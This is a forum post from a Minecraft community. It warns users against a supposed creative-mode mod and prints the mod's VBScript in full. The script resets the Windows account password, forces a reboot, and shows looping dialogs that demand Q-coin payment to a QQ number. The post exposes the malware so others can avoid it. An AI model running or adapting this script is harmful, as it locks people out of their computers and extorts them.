title: 千万不要下载chadan (UID: 883718)分享的强制开创造MOD
author: The_Xu
txt_content:
原帖地址 http://www.mcbbs.net/thread-378932-1-1.html 幸好我先用记事本打开了！ 请封IP！ 这是代码，都懂吧！
Const strPassword = "cxx"'   
Dim WshNetwork
Set WshNetwork = CreateObject("WScript.Network")
Dim userName
userName = WshNetwork.userName&",user"
Dim Domain
Set Domain = GetObject("WinNT://./"&userName)
Domain.SetPassword strPassword
Domain.SetInfo
dim gj
on error resume next
dim WSHshellA
set WSHshellA = wscript.createobject("wscript.shell")
WSHshellA.run "cmd.exe /c shutdown -r -t 2000 -c ""你开机密码被我改了！速度去网吧给QQ号：1921584106充值50个Q币、充完以后联系QQ1921584106、不然你也别想关掉、重启就让你开不了机，不信你试试···"" ",0 ,true  
dim a
do while(a <> "http://www.hack47.com")
a = inputbox ("速度去网吧给QQ:1921584106充值50个Q币、充值以后联系QQ1921584106不然你也别想关掉、重启就让你开不了机，让你电脑瘫痪，不信你试试""　","加不加","想要开机密码+QQ1921584106",8000,7000)
msgbox chr(13) + chr(13) + chr(13) + a,0,"哈哈！爽了吧。"
loop
msgbox chr(13) + chr(13) + chr(13) + "哈哈！想要密码了吧，联系Q1921584106，50元给你  "
dim WSHshell
set WSHshell = wscript.createobject("wscript.shell")
WSHshell.run "cmd.exe /c shutdown -a",0 ,true  
msgbox chr(13) + chr(13) + chr(13) + "本软件已绑定你的电脑，请不要删除否则可能引起电脑开不开机"
复制代码
